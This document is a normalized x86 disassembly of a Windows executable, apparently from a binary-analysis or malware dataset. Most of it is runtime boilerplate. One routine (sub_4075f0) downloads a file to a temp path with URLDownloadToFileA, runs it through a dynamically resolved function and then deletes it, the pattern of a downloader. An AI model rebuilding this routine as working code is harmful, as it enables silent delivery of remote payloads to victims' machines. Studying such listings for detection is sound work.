jne r-xdata
lea ecx [ eax + 0x23 ]
cmp ecx eax
jbe r-xdata
jmp r-xdata
call sub_40e4ee
push ecx
call sub_40d5ac
mov ecx eax
add esp 0x4
test ecx ecx
je r-xdata
call sub_413b11
call sub_413b11
lea eax [ ecx + 0x23 ]
and eax 0xffffffe0
mov [ eax - 0x4 ] ecx
pop ebp
retn 0x4
sub_4072f0
push ebp
mov ebp esp
and esp 0xfffffff8
lea eax [ ebp + 0x10 ]
push eax
push 0x0
push [ ebp + 0xc ]
push 0x80
push [ ebp + 0x8 ]
call sub_407390
push [ eax + 0x4 ]
push [ eax ]
call sub_414ef6
or ecx 0xffffffff
add esp 0x1c
test eax eax
cmovs eax ecx
mov esp ebp
pop ebp
retn
sub_407330
push ebp
mov ebp esp
and esp 0xfffffff8
lea eax [ ebp + 0x10 ]
push eax
push 0x0
push [ ebp + 0xc ]
push 0x10
push [ ebp + 0x8 ]
call sub_407390
push [ eax + 0x4 ]
push [ eax ]
call sub_414ef6
or ecx 0xffffffff
add esp 0x1c
test eax eax
cmovs eax ecx
mov esp ebp
pop ebp
retn
sub_4073a0
push ebp
mov ebp esp
and esp 0xfffffff0
sub esp 0x28
push esi
push edi
mov edi [ ebp + 0x8 ]
lea eax [ esp + 0x8 ]
push eax
xorps xmm0 xmm0
lea eax [ esp + 0x14 ]
push eax
movaps [ esp + 0x18 ] xmm0
movaps [ esp + 0x28 ] xmm0
movaps xmm0 [ r--data ]
push 0x0
push edi
movaps [ esp + 0x20 ] xmm0
call [ getaddrinfo@IAT ]
mov esi eax
cmp esi 0x2af9
je r-xdata
lea eax [ esp + 0x8 ]
mov [ esp + 0x10 ] 0x0
push eax
lea eax [ esp + 0x14 ]
push eax
push 0x0
push edi
call [ getaddrinfo@IAT ]
mov ecx eax
test ecx ecx
je r-xdata
test esi esi
je r-xdata
mov ecx [ esp + 0x8 ]
cmp [ ecx + 0x4 ] 0x2
je r-xdata
mov edx 0x8
mov eax 0x2ee7
cmp ecx edx
cmove eax edx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0xc
push [ esp + 0x8 ]
call [ freeaddrinfo@IAT ]
push edi
call [ lstrlenA@IAT ]
mov edx [ ebp + 0x10 ]
mov ecx [ edx ]
mov [ esp + 0xc ] ecx
cmp ecx eax
jb r-xdata
mov ecx 0x8
mov eax 0x2ee7
cmp esi ecx
cmove eax ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0xc
mov eax [ ebp + 0x10 ]
push 0x2
push 0x0
push 0x0
push [ eax ]
push [ ebp + 0xc ]
push [ ecx + 0x10 ]
push [ ecx + 0x18 ]
call [ getnameinfo@IAT ]
test eax eax
mov ecx 0x2ee7
cmovne eax ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0xc
nop
inc eax
mov [ edx ] eax
mov eax 0x7a
pop edi
pop esi
mov esp ebp
pop ebp
retn 0xc
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
pop edi
mov eax 0x2ee7
pop esi
mov esp ebp
pop ebp
retn 0xc
cmp [ ecx + 0x4 ] 0x2
jne r-xdata
push edi
push [ esp + 0x10 ]
push ecx
call sub_414f1a
add esp 0xc
mov eax esi
pop edi
pop esi
mov esp ebp
pop ebp
retn 0xc
mov ecx [ ecx + 0x1c ]
test ecx ecx
je r-xdata
sub_4074e0
push ebp
mov ebp esp
sub esp 0x108
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x108 ]
push ecx
lea ecx [ ebp - 0x104 ]
mov [ ebp - 0x108 ] 0xfe
push ecx
push eax
call sub_4073a0
mov ecx [ ebp - 0x4 ]
neg eax
sbb eax eax
xor ecx ebp
inc eax
call sub_40d56a
mov esp ebp
pop ebp
retn 0x4
sub_407530
push ebp
mov ebp esp
sub esp 0x104
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ ebp + 0x8 ]
lea eax [ ebp - 0x104 ]
push edi
mov edi [ ebp + 0xc ]
push 0xfe
push eax
call [ gethostname@IAT ]
test eax eax
je r-xdata
push edi
push esi
lea eax [ ebp - 0x104 ]
push eax
call sub_4073a0
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40d56a
mov esp ebp
pop ebp
retn 0x8
pop edi
mov eax 0x2ee4
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40d56a
mov esp ebp
pop ebp
retn 0x8
sub_4075a0
push ebp
mov ebp esp
push ebx
push esi
mov esi [ inet_addr@IAT ]
push edi
push [ ebp + 0x8 ]
call esi
push [ ebp + 0xc ]
mov edi eax
call esi
push [ ebp + 0x10 ]
mov ebx eax
call esi
cmp ebx 0xffffffff
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
pop ebp
retn 0xc
cmp edi 0xffffffff
je r-xdata
and eax edi
cmp eax ebx
jne r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
pop ebp
retn 0xc
sub_4075f0
push ebp
mov ebp esp
sub esp 0xf44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
push 0x401
lea eax [ ebp - 0xf10 ]
mov edi edx
push 0x0
push eax
mov esi ecx
call sub_411230
push 0x100
lea eax [ ebp - 0x208 ]
push 0x0
push eax
call sub_411230
mov ecx esi
add esp 0x18
lea edx [ ecx + 0x1 ]
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
lea eax [ ebp - 0x208 ]
push ecx
push esi
push eax
call sub_4117a0
push 0x400
lea eax [ ebp - 0x70c ]
push 0x0
push eax
call sub_411230
mov ecx edi
add esp 0x18
lea edx [ ecx + 0x1 ]
nop [ eax + eax ] ax
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
lea eax [ ebp - 0x70c ]
push ecx
push edi
push eax
call sub_4117a0
lea eax [ ebp - 0xb0c ]
mov [ ebp - 0xf18 ] 0x400
mov [ ebp - 0xf14 ] eax
lea eax [ ebp - 0xf44 ]
push 0x400
mov [ ebp - 0xf1c ] eax
lea eax [ ebp - 0xb0c ]
push 0x0
push eax
mov [ ebp - 0xf44 ] sub_4074e0
mov [ ebp - 0xf40 ] sub_407530
mov [ ebp - 0xf3c ] sub_4073a0
mov [ ebp - 0xf38 ] sub_4075a0
mov [ ebp - 0xf34 ] 0x0
mov [ ebp - 0xf30 ] 0x0
mov [ ebp - 0xf2c ] 0x0
mov [ ebp - 0xf28 ] 0x0
mov [ ebp - 0xf24 ] 0x0
call sub_411230
add esp 0x18
push r--data
call [ LoadLibraryW@IAT ]
mov ebx [ GetProcAddress@IAT ]
mov esi eax
push r--data
push esi
call ebx
mov [ ebp - 0xf20 ] eax
test eax eax
je r-xdata
mov edi [ ebp - 0xf18 ]
push r--data
push esi
call ebx
mov edi eax
test edi edi
je r-xdata
mov esi [ ebp - 0xf14 ]
push r--data
push esi
call ebx
mov esi eax
jmp r-xdata
lea eax [ ebp - 0x30c ]
push eax
push 0x104
call [ GetTempPathA@IAT ]
lea eax [ ebp - 0x108 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x30c ]
push eax
call [ GetTempFileNameA@IAT ]
push 0x0
push 0x0
lea eax [ ebp - 0x108 ]
push eax
lea eax [ ebp - 0x70c ]
push eax
push 0x0
call [ URLDownloadToFileA@IAT ]
push 0x0
lea eax [ ebp - 0xf1c ]
push eax
push 0x0
lea eax [ ebp - 0x108 ]
push eax
push 0x0
call [ ebp - 0xf20 ]
lea eax [ ebp - 0x108 ]
push eax
call [ DeleteFileA@IAT ]
lea eax [ ebp - 0xf18 ]
push eax
lea eax [ ebp - 0xf14 ]
push eax
push 0x100
lea eax [ ebp - 0x208 ]
push eax
push 0x401
lea eax [ ebp - 0xf10 ]
push eax
call esi
push 0x0
push 0x0
call edi
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0xf14 ]
xor ecx ebp
pop edi
pop esi
pop ebx
call sub_40d56a
mov esp ebp
pop ebp
retn
sub_407820
push ebp
mov ebp esp
sub esp 0x8
mov eax [ ebp + 0x8 ]
xorps xmm0 xmm0
push esi
mov esi ecx
mov [ ebp - 0x8 ] eax
lea edx [ esi + 0x4 ]
mov [ ebp - 0x4 ] 0x1
push edx
lea eax [ ebp - 0x8 ]
mov [ esi ] r--data
push eax
movq [ edx ] xmm0
call sub_4109ad
add esp 0x8
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_407860
push ebp
mov ebp esp
push esi
mov esi ecx
xorps xmm0 xmm0
lea eax [ esi + 0x4 ]
push eax
mov [ esi ] r--data
movq [ eax ] xmm0
mov eax [ ebp + 0x8 ]
add eax 0x4
push eax
call sub_4109ad
add esp 0x8
mov eax esi
pop esi
pop ebp
retn 0x4
sub_4078a0
push ebp
mov ebp esp
push esi
mov esi ecx
lea eax [ esi + 0x4 ]
mov [ esi ] r--data
push eax
call sub_410a10
add esp 0x4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push 0xc
push esi
call sub_40d57b
add esp 0x8
sub_4078f0
push ebp
mov ebp esp
push 0xffffffff
push sub_42a53a
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
push 0x0
call sub_40e578
mov [ ebp - 0x4 ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
mov [ esi + 0xc ] 0x0
mov [ esi + 0x10 ] 0x0
xor eax eax
mov [ esi + 0x14 ] 0x0
mov [ esi + 0x18 ] ax
mov [ esi + 0x1c ] eax
mov [ esi + 0x20 ] ax
mov [ esi + 0x24 ] eax
mov [ esi + 0x28 ] al
mov [ esi + 0x2c ] eax
mov [ esi + 0x30 ] al
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x6
test eax eax
jne r-xdata
push eax
push esi
call sub_40e8c0
add esp 0x8
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x20 ]
mov [ ebp - 0x24 ] r--data
push eax
lea eax [ ebp - 0x18 ]
mov [ ebp - 0x18 ] r--data
xorps xmm0 xmm0
mov [ ebp - 0x14 ] 0x1
push eax
movq [ ebp - 0x20 ] xmm0
call sub_4109ad
add esp 0x8
mov [ ebp - 0x24 ] r--data
lea eax [ ebp - 0x24 ]
push r--data
push eax
call sub_4111b8
sub_4079d0
push ebp
mov ebp esp
push 0xffffffff
push sub_42a560
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
push esi
call sub_40e90b
mov eax [ esi + 0x2c ]
add esp 0x4
test eax eax
je r-xdata
mov [ esi + 0x2c ] 0x0
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
push eax
call j_sub_41a3a5#2
add esp 0x4
mov [ esi + 0x24 ] 0x0
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
push eax
call j_sub_41a3a5#2
add esp 0x4
mov [ esi + 0x1c ] 0x0
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
push eax
call j_sub_41a3a5#2
add esp 0x4
mov [ esi + 0x14 ] 0x0
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call j_sub_41a3a5#2
add esp 0x4
mov [ esi + 0xc ] 0x0
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call j_sub_41a3a5#2
add esp 0x4
mov ecx esi
mov [ esi + 0x4 ] 0x0
call sub_40e5d0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push eax
call j_sub_41a3a5#2
add esp 0x4
sub_407aa0
push ebp
mov ebp esp
push esi
mov esi ecx
xorps xmm0 xmm0
lea eax [ esi + 0x4 ]
push eax
mov [ esi ] r--data
movq [ eax ] xmm0
mov eax [ ebp + 0x8 ]
add eax 0x4
push eax
call sub_4109ad
add esp 0x8
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_407ae0
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push 0x4
push esi
call sub_40d57b
add esp 0x8
sub_407b40
push ebp
mov ebp esp
push 0xffffffff
push sub_42a580
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ecx [ ecx + 0x4 ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
mov eax [ ecx ]
call [ eax + 0x8 ]
test eax eax
je r-xdata
mov edx [ eax ]
mov ecx eax
push 0x1
call [ edx ]
sub_407ba0
push ebp
mov ebp esp
push 0xffffffff
push sub_42a5af
mov eax [ fs : 0x0 ]
push eax
sub esp 0x48
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x10 ] 0x0
test esi esi
je r-xdata
mov eax 0x2
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
cmp [ esi ] 0x0
jne r-xdata
push 0x18
call sub_40d5ac
mov edi eax
add esp 0x4
mov [ ebp + 0x8 ] edi
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x0
mov edx [ ecx + 0x4 ]
test edx edx
jne r-xdata
mov ecx [ edx + 0x18 ]
test ecx ecx
jne r-xdata
mov ecx r--data
jmp r-xdata
push ecx
lea ecx [ ebp - 0x54 ]
call sub_4078f0
lea eax [ ebp - 0x20 ]
mov [ edi + 0x4 ] 0x0
push eax
mov [ edi ] r--data
call sub_40e9df
add esp 0x4
lea ecx [ ebp - 0x54 ]
movups xmm0 [ eax ]
movups [ edi + 0x8 ] xmm0
mov [ esi ] edi
call sub_4079d0
lea ecx [ edx + 0x1c ]
sub_407c80
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
xor edx edx
push esi
mov esi [ ebp + 0x8 ]
sub ebx esi
push edi
xor edi edi
cmp esi [ ebp + 0xc ]
cmova ebx edx
test ebx ebx
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
lea eax [ ecx + 0x8 ]
mov [ ebp + 0xc ] eax
push eax
movzx eax [ esi ]
push eax
call sub_40ea4a
mov [ esi ] al
inc edi
mov eax [ ebp + 0xc ]
add esp 0x8
inc esi
cmp edi ebx
jne r-xdata
sub_407cf0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
xor edx edx
push esi
mov esi [ ebp + 0x8 ]
sub ebx esi
push edi
xor edi edi
cmp esi [ ebp + 0xc ]
cmova ebx edx
test ebx ebx
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
lea eax [ ecx + 0x8 ]
mov [ ebp + 0xc ] eax
push eax
movzx eax [ esi ]
push eax
call sub_40eb44
mov [ esi ] al
inc edi
mov eax [ ebp + 0xc ]
add esp 0x8
inc esi
cmp edi ebx
jne r-xdata
sub_407d50
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
sub ecx edx
push ecx
push edx
push [ ebp + 0x10 ]
call sub_4117a0
mov eax [ ebp + 0xc ]
add esp 0xc
pop ebp
retn 0xc
sub_407d80
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
sub ecx edx
push ecx
push edx
push [ ebp + 0x14 ]
call sub_4117a0
mov eax [ ebp + 0xc ]
add esp 0xc
pop ebp
retn 0x10
sub_407da0
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
mov [ esi ] r--data
test eax eax
jle r-xdata
jns r-xdata
push [ esi + 0xc ]
call j_sub_41a3a5#2
jmp r-xdata
push [ esi + 0x14 ]
call j_sub_41a3a5#2
add esp 0x4
mov [ esi ] r--data
test [ ebp + 0x8 ] 0x1
je r-xdata
push [ esi + 0xc ]
call j_sub_41a3a5#3
add esp 0x4
mov eax esi
pop esi
pop ebp
retn 0x4
push 0x18
push esi
call sub_40d57b
add esp 0x8
sub_407e00
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push 0x8
push esi
call sub_40d57b
add esp 0x8
sub_407e30
push ebp
mov ebp esp
push ecx
mov eax [ ecx + 0x4 ]
push [ ecx ]
mov ecx eax
mov [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn 0x4
sub_407e80
push ebp
mov ebp esp
mov eax [ ecx ]
lea edx [ ebp - 0x8 ]
sub esp 0x8
push esi
push [ ebp + 0x8 ]
push edx
call [ eax + 0xc ]
mov esi [ ebp + 0xc ]
mov ecx [ eax + 0x4 ]
mov edx [ esi + 0x4 ]
mov ecx [ ecx + 0x4 ]
cmp ecx [ edx + 0x4 ]
jne r-xdata
xor al al
pop esi
mov esp ebp
pop ebp
retn 0x8
mov eax [ eax ]
cmp eax [ esi ]
jne r-xdata
mov al 0x1
pop esi
mov esp ebp
pop ebp
retn 0x8
sub_407ec0
push ebp
mov ebp esp
mov eax [ ecx + 0x4 ]
push esi
mov esi [ ebp + 0x8 ]
mov edx [ esi + 0x4 ]
cmp eax [ edx + 0x4 ]
jne r-xdata
xor al al
pop esi
pop ebp
retn 0x8
mov eax [ esi ]
cmp eax [ ebp + 0xc ]
jne r-xdata
mov al 0x1
pop esi
pop ebp
retn 0x8
sub_407ef0
mov eax [ fs : 0x2c ]
push esi
mov esi ecx
mov edx [ eax ]
mov eax [ rw-data ]
cmp eax [ edx + 0x4 ]
jle r-xdata
mov [ esi ] 0x1
mov eax esi
mov [ esi + 0x4 ] rw-data
pop esi
retn
push rw-data
call sub_40d978
add esp 0x4
cmp [ rw-data ] 0xffffffff
jne r-xdata
push sub_42ae30
mov [ rw-data ] r--data
mov [ rw-data ] 0x5
call sub_40d83a
push rw-data
call sub_40d939
add esp 0x8
sub_407f60
push ebp
mov ebp esp
push 0xffffffff
push sub_42a5e0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x2c ] esi
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x20 ] 0x0
sete al
test al al
jne r-xdata
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp + 0x8 ]
call sub_407e30
push 0xffffffff
push 0x0
push eax
lea ecx [ ebp + 0x10 ]
mov [ ebp - 0x4 ] 0x1
call sub_40b570
mov eax [ ebp - 0x14 ]
cmp eax 0x10
jb r-xdata
push 0x2
push r--data
lea ecx [ ebp + 0x10 ]
call sub_40b440
lea eax [ ebp + 0x10 ]
mov ecx esi
push eax
call sub_409de0
mov ecx [ ebp + 0x24 ]
cmp ecx 0x10
jb r-xdata
inc eax
lea ecx [ ebp - 0x28 ]
push eax
push [ ebp - 0x28 ]
call sub_406f10
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_40d56a
mov esp ebp
pop ebp
retn
inc ecx
push ecx
push [ ebp + 0x10 ]
lea ecx [ ebp + 0x10 ]
call sub_406f10
sub_408030
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push esi
sub esp 0x18
mov esi ecx
mov ecx esp
mov [ ebp - 0x24 ] esi
push 0xffffffff
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
call sub_406b90
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x20 ]
push [ ebp + 0xc ]
call sub_407f60
mov ecx eax
add esp 0x20
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
lea eax [ esi + 0x4 ]
mov [ esi ] r--data
xorps xmm0 xmm0
mov [ ebp - 0x28 ] ecx
push eax
movq [ eax ] xmm0
lea eax [ ebp - 0x28 ]
push eax
mov [ ebp - 0x24 ] 0x1
call sub_4109ad
mov eax [ ebp - 0xc ]
add esp 0x8
mov [ esi ] r--data
cmp eax 0x10
jb r-xdata
mov ecx [ ecx ]
mov ecx [ ebp + 0xc ]
mov eax esi
mov [ esi + 0xc ] ecx
mov ecx [ ebp + 0x10 ]
mov [ esi + 0x10 ] ecx
mov ecx [ ebp - 0x8 ]
mov [ esi ] r--data
xor ecx ebp
pop esi
call sub_40d56a
mov esp ebp
pop ebp
retn 0xc
inc eax
lea ecx [ ebp - 0x20 ]
push eax
push [ ebp - 0x20 ]
call sub_406f10
sub_4080f0
push ebp
mov ebp esp
push esi
mov esi ecx
lea eax [ esi + 0x4 ]
mov [ esi ] r--data
push eax
call sub_410a10
add esp 0x4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push 0x14
push esi
call sub_40d57b
add esp 0x8
sub_408120
push ebp
mov ebp esp
push 0xffffffff
push sub_42a618
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x30 ] esi
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] 0x0
cmp [ edx ] 0x0
jne r-xdata
mov ecx edx
lea edi [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edi
push ecx
push edx
lea ecx [ ebp - 0x2c ]
call sub_406a90
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x2c ]
push [ ebp + 0x10 ]
mov ecx esi
push [ ebp + 0xc ]
push eax
call sub_408030
mov ecx [ ebp - 0x18 ]
cmp ecx 0x10
jb r-xdata
mov eax esi
mov [ esi ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_40d56a
mov esp ebp
pop ebp
retn 0xc
inc ecx
push ecx
push [ ebp - 0x2c ]
lea ecx [ ebp - 0x2c ]
call sub_406f10
sub_4081e0
push ebp
mov ebp esp
push ecx
push esi
push [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x0
call sub_40ec3e
mov esi [ ebp + 0x8 ]
mov edx eax
add esp 0x4
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
cmp [ edx ] 0x0
jne r-xdata
mov ecx edx
push edi
lea edi [ ecx + 0x1 ]
nop [ eax ] eax
xor ecx ecx
push ecx
push edx
mov ecx esi
call sub_406a90
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x8
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edi
pop edi
push ecx
push edx
mov ecx esi
call sub_406a90
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x8
sub_408260
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x0
push esi
mov esi [ ebp + 0x8 ]
cmp eax 0x1
jne r-xdata
push eax
push esi
call sub_4081e0
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x8
push 0x15
mov [ esi + 0x14 ] 0xf
mov ecx esi
mov [ esi + 0x10 ] 0x0
push r--data
mov [ esi ] 0x0
call sub_406a90
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x8
sub_4082b0
push ebp
mov ebp esp
and esp 0xfffffff8
mov eax [ ebp + 0x8 ]
sub esp 0x20
and eax 0x17
mov [ ecx + 0xc ] eax
mov ecx [ ecx + 0x10 ]
and ecx eax
je r-xdata
mov esp ebp
pop ebp
retn 0x8
cmp [ ebp + 0xc ] 0x0
jne r-xdata
push 0x0
push 0x0
call sub_4111b8
test cl 0x4
jne r-xdata
lea ecx [ esp + 0x4 ]
call sub_407ef0
lea ecx [ esp + 0xc ]
push [ eax + 0x4 ]
push [ eax ]
push r--data
call sub_408120
push r--data
lea eax [ esp + 0x10 ]
mov [ esp + 0x10 ] r--data
push eax
call sub_4111b8
test cl 0x2
lea ecx [ esp + 0x4 ]
jne r-xdata
call sub_407ef0
lea ecx [ esp + 0xc ]
push [ eax + 0x4 ]
push [ eax ]
push r--data
call sub_408120
push r--data
lea eax [ esp + 0x10 ]
mov [ esp + 0x10 ] r--data
push eax
call sub_4111b8
jmp r-xdata
call sub_407ef0
lea ecx [ esp + 0xc ]
push [ eax + 0x4 ]
push [ eax ]
push r--data
call sub_408120
push r--data
lea eax [ esp + 0x10 ]
mov [ esp + 0x10 ] r--data
push eax
call sub_4111b8
int3
sub_408380
push ebp
mov ebp esp
push 0xffffffff
push sub_42a646
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ecx + 0x30 ]
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
mov ecx [ eax + 0x4 ]
mov [ esi + 0x4 ] ecx
mov edx [ ecx ]
call [ edx + 0x4 ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_4083d0
push ebp
mov ebp esp
push 0xffffffff
push sub_42a676
mov eax [ fs : 0x0 ]
push eax
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
push 0x0
push 0x0
mov [ edi + 0x30 ] 0x0
mov [ edi + 0x8 ] 0x0
mov [ edi + 0x10 ] 0x0
mov [ edi + 0x14 ] 0x201
mov [ edi + 0x18 ] 0x6
mov [ edi + 0x1c ] 0x0
mov [ edi + 0x20 ] 0x0
mov [ edi + 0x24 ] 0x0
mov [ edi + 0x28 ] 0x0
mov [ edi + 0x2c ] 0x0
call sub_4082b0
push 0x8
call sub_40d5ac
add esp 0x4
mov esi eax
push 0x1
mov [ ebp - 0x4 ] 0x0
call sub_40e7bd
mov [ esi + 0x4 ] eax
add esp 0x4
mov [ edi + 0x30 ] esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_408480
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xorps xmm0 xmm0
push edi
mov edi ecx
lea eax [ edi + 0x4 ]
push eax
mov [ edi ] r--data
movq [ eax ] xmm0
lea eax [ esi + 0x4 ]
push eax
call sub_4109ad
mov [ edi ] r--data
add esp 0x8
mov eax [ esi + 0xc ]
mov [ edi + 0xc ] eax
mov eax [ esi + 0x10 ]
mov [ edi + 0x10 ] eax
mov eax edi
mov [ edi ] r--data
pop edi
pop esi
pop ebp
retn 0x4
sub_4084d0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xorps xmm0 xmm0
push edi
mov edi ecx
lea eax [ edi + 0x4 ]
push eax
mov [ edi ] r--data
movq [ eax ] xmm0
lea eax [ esi + 0x4 ]
push eax
call sub_4109ad
mov [ edi ] r--data
add esp 0x8
mov eax [ esi + 0xc ]
mov [ edi + 0xc ] eax
mov eax [ esi + 0x10 ]
mov [ edi + 0x10 ] eax
mov eax edi
mov [ edi ] r--data
pop edi
pop esi
pop ebp
retn 0x4
sub_408520
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xorps xmm0 xmm0
push edi
mov edi ecx
lea eax [ edi + 0x4 ]
push eax
mov [ edi ] r--data
movq [ eax ] xmm0
lea eax [ esi + 0x4 ]
push eax
call sub_4109ad
mov [ edi ] r--data
add esp 0x8
mov eax [ esi + 0xc ]
mov [ edi + 0xc ] eax
mov eax [ esi + 0x10 ]
mov [ edi + 0x10 ] eax
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
sub_408570
push ebp
mov ebp esp
push 0xffffffff
push sub_42a6a6
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x4 ] 0x0
push esi
mov [ esi ] r--data
call sub_40ec95
add esp 0x4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push 0x38
push esi
call sub_40d57b
add esp 0x8
sub_4085d0
push ebp
mov ebp esp
push 0xffffffff
